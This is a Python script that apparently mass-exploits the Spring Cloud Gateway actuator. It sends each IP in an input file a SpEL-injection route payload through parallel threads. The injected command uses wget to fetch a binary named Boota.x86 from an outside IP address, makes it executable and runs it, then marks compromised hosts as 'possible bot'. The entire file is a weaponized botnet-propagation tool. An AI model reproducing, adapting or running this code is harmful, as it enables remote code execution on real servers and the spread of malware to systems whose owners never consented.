import requests
import sys
import threading
import time
import json

headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
}

headers2 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
}

payload = '''{\r
    "id": "asfldjkhwt8423t7843098trdaslkjfhoyrw4r8o3247d98eyoiusdahoifvyqw89er7234o87",\r
    "filters": [{\r
    "name": "AddResponseHeader",\r
    "args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"rm -rf Boota.10wget;wget http://149.57.171.148/Boota.x86 -O Boota.10wget;chmod 777 Boota.10wget;./Boota.10wget x86.wget;rm -rf Boota.10wget;\\\"}).getInputStream()))}"}\r
    }],\r
    "uri": "http://example.com",\r
    "order": 0\r
}'''


def attack(url):
    try:
        resp = requests.post(url="http://" + url + ":8080/" + "actuator/gateway/routes/hacktest",
                            data=payload, headers=headers1, json=json, timeout=10)
        requests.post(url="http://" + url + ":8080/" +
                    "actuator/gateway/refresh", headers=headers2, timeout=10)
        requests.get(url="http://" + url + ":8080/" +
                    "actuator/gateway/routes/hacktest", headers=headers2, timeout=10)
        requests.delete(url="http://" + url + ":8080/" +
                        "actuator/gateway/routes/hacktest", headers=headers2, timeout=10)
        resp1 = requests.post(url="http://" + url + ":8080/" +
                    "actuator/gateway/refresh", headers=headers2, timeout=10)
        if resp.status_code == 201 and resp1.status_code == 200:
            print("[spring-cloud] possible bot: " + url)
    except:
        pass


with open(sys.argv[1], "r") as f:
    threads = []

    for ip in f.readlines():
        x = threading.Thread(target=attack, args=(ip.strip(),)).start()
        
        threads.append(x)
        
        time.sleep(0.02)

    for thread in threads:
        thread.join()